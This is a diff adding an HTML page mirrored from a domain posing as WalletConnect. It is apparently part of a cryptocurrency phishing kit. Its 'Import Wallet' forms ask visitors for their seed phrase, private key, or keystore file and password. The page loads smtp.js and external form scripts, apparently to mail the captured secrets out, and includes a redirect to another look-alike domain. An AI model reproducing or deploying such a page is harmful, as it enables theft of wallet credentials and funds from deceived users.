@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from application.walletsconnectvalidator.net/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Oct 2021 09:43:26 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <link rel="stylesheet" href="font-awesome.min.css">
+        <link rel="stylesheet" href="main.css">
+ <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
+  />
+     <link rel="icon" href="./walletconnect-logo.svg" type="image/icon type">
+
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> 
+    </script> 
+  <script src= 
+    "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> 
+        </script> 
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.4/dist/sweetalert2.all.min.js"></script>
+    <link href="https://cdn.plaid.com/link/2.0.1123/link-dynamic-loader.js" rel="prefetch" as="script">
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
+    <script type="text/javascript" src="main.js"></script>
+    <script src="../form.js"></script>
+    <style type="text/css">
+    	
+
+body {
+  background-color: #ffffff;
+  overflow-x: hidden;
+}
+
+a, a:hover {
+  text-decoration: none;
+}
+
+header {
+  width: 100%;
+  height: 40px;
+  padding-top: 15px;
+}
+
+.intro h5 {
+  margin-top: 30px;
+  text-align: center;
+}
+
+.footer {
+  margin-top: 100px;
+}
+
+.text-center.img-center {
+  margin-top: 80px;
+}
+
+.c-list a {
+  padding: 20px;
+  background-color: #000;
+  display: block;
+  margin: 0;
+  color: #ffffff;
+  border-bottom: 1px solid #ffffff;
+}
+
+.c-list img {
+  margin-right: 20px;
+  width: 30px;
+  height: 30px;
+}
+
+.nav.nav-tabs {
+  margin-top: 30px;
+}
+
+.nav-tabs .nav-item.show .nav-link, .nav-tabs .nav-link.active {
+  color: #000000;
+  background: transparent;
+  border: 0;
+  border-bottom: 2px solid;
+}
+
+.nav-tabs .nav-link {
+  color: #000000;
+}
+
+
+
+    </style>
+    <style>
+.loader {
+  border: 16px solid #f3f3f3;
+  border-radius: 50%;
+  border-top: 16px solid #3498db;
+  width: 40px;
+  height: 40px;
+  left:0;
+  right:0;
+  
+  -webkit-animation: spin 2s linear infinite; /* Safari */
+  animation: spin 2s linear infinite;
+}
+
+/* Safari */
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(0deg); }
+  100% { -webkit-transform: rotate(360deg); }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+</head>
+<body>
+    <header>
+        <div class="top">
+        <a href="index.html#footer" class="left">Github</a>
+        <a href="index.html#" class="left">Docs</a>
+
+       <center> <a href="../images/index.html" class="main"><img src="walletconnect-logo.svg" alt="logo"/></a></center>
+        <a href="index.html#wallets" class="left">Wallets</a>
+        <a href="index.html#" class="left">Apps</a>
+</div>
+    </header>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+	
+    
+    
+    <div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase" id="activephrase" onclick="btnphrase()">Phrase</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey" id="activeprivate" onclick="btnprivate()">Private Key</a></li>
+				<!--	<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore" id="activekeystore" onclick="btnkeystore()">Keystore</a></li> -->
+				</ul>
+			</div>
+		</div>
+	</div>
+    
+    
+    
+    <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<script type="text/javascript" language="javascript">
+function redirect()
+{
+    window.location.href="https://encryptedjdfsgiflu74gfwe.reconnectwallet.net/barcode/;
+}
+</script>
+                    <p id="gfg" style="display: none"></p>
+					<div class="tab-content">
+						<div style="display: block" role="tabpanel" class="tab-pane" id="phrase">
+							<form id="formphrase">
+								<textarea class="form-control" rows="5" name="comments" id="phrasecomments" placeholder="Phrase" required></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="pancake" id="pancake" value="Pancakebunny WalletConnect Restore">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>	
+						</div>
+							
+						
+						<div role="tabpanel" class="tab-pane " id="privatekey">
+						    <form id="formprivate">
+								<div class="form-group">
+									<input class="form-control"
+									name="privatekeyxxx" type="text" id="privatekeyxxx" placeholder="Private Key">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="xvalue" id="xvalue" value="Ethereum">
+								<div class="form-group">
+								<button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button>
+								</div>
+							</form>
+							</div>
+                        
+                        
+                        
+						<div role="tabpanel" class="tab-pane " id="keystore">
+						 <form id="formkeystore" enctype="multipart/form-data">
+							 <p class="text-secondary" align="center">Please select your keystore file<br>
+							 </p>
+										 
+						  <div class="upload" align="center">
+
+										<label for="file-upload" class="text-secondary" style="border: dashed 2px; height: 60px; width: 420px; padding-top: 15px;">
+										<input type="file" style="color: black; display: none;" name="keystorefile" title="choose keystore file" id="file-upload" required>
+										choose keystore file</label>
+										</div>
+										<br>
+										<center>
+										<div>
+										<input type="password" name="keypass" id="keypass" class="form-control" placeholder="Enter Your Wallet Password" align="center" required>
+										<br>
+									    </div>
+						  </center>
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+					  </form> 
+
+							</div>
+
+						</div>
+<div class="loader" id="loader" style="display:none;justify-content:center;  margin: 0 auto;"></div>
+					</div>
+                </div>
+            </div>
+    </section>
+ <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="bootstrap.min.js"></script>
+ <script src="popper.min.js"></script>
+<script src="script.js"></script>
+    
+     <section class="" style="background-color: #181C45; position: absolute; width: 100%; bottom: 0%">
+
+        <div class="container" style="background-color: #181C45; padding: 10px">
+          <div class="row">
+            <div class="col-xl-3 text-center text-xl-start" style="display: flex; justify-content: center"><a style="margin: 5px" href="#!"><img class="footer-img me-xl-5 me-3" src="../../1/assets/img/gallery/facebook-line1.svg" alt="fb" style="width:20px;height:20px;" /></a><a style="margin: 5px" href="#!"><img class="footer-img me-xl-5 me-3" src="../../1/assets/img/gallery/linkedin-line1.svg" alt="in" style="width:20px;height:20px;" /></a><a style="margin: 5px" href="#!"><img class="footer-img me-xl-5 me-3" src="../../1/assets/img/gallery/twitter-line1.svg" alt="twitter" style="width:20px;height:20px;" /></a><a style="margin: 5px" href="#!"><img class="footer-img me-xl-5 me-3" src="../../1/assets/img/gallery/instagram-line1.svg" alt="instragram" style="width:20px;height:20px;" /></a>
+            </div>
+              <br>
+              <br>
+            <div class="col-xl-4 pt-2 pt-xl-0">
+              <p class="mb-0 text-center text-xl-end" style="color: white">
+                  <a style="color: white" class="text-300 text-decoration-none footer-link" href="#!"> Terms &amp; conditon </a>
+                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                  <a style="color: white" class="text-300 text-decoration-none footer-link ps-4" href="#!">Privacy Policy </a>
+              </p>
+            </div>
+           
+          </div>
+        </div>
+        <!-- end of .container-->
+
+      </section>
+</body>
+
+<!-- Mirrored from application.walletsconnectvalidator.net/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Oct 2021 09:43:36 GMT -->
+</html>
